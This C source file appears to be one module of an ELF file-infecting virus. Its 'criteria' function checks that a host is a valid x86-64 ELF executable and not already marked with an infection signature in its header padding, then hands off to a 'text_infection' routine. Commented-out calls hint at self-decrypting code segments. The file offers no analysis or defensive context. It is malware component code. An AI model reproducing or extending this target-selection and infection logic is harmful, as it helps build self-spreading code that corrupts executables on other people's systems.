#include <war.h>

////////////////////////////////////////////////////////////////////////////////
/// PUBLIC FUNCTION
////////////////////////////////////////////////////////////////////////////////

void criteria(struct s_host *host, struct s_keychain *keychain, enum e_context context)
{
//	decrypt_left(keychain, (char *)&host_constructor, (void *)&criteria - (void *)&host_constructor);

	printf("%s\t\t%s\n",__PRETTY_FUNCTION__, context == SUCCESS ? "success" : "error");
	if (context == FAILURE)
		goto label;

	if (host->filesize < sizeof(Elf64_Ehdr))
	{
		context = FAILURE;
		goto label;
	}
	if (host->header->e_shoff + (host->header->e_shnum * sizeof(Elf64_Shdr)) != host->filesize)
	{
		context = FAILURE;
		goto label;
	}
	if (*(uint32_t *)host->header != ELF_MAGIC_NUMBER)
	{
		context = FAILURE;
		goto label;
	}
	if (host->header->e_ident[EI_CLASS] != X86_64_MAGIC_NUMBER)
	{
		context = FAILURE;
		goto label;
	}
	if (host->header->e_entry == 0)
	{
		context = FAILURE;
		goto label;
	}
	if (*(unsigned int *)((char *)&host->header->e_ident[EI_PAD]) == INFECTED_MAGIC_NUMBER)
	{
		context = FAILURE;
		goto label;
	}

label:
//	update_keychain_left(keychain, (char *)criteria, (void *)text_infection - (void *)criteria);
//	decrypt_left(keychain, (char *)text_infection, (void *)note_infection - (void *)text_infection);

	text_infection(host, keychain, context);
}
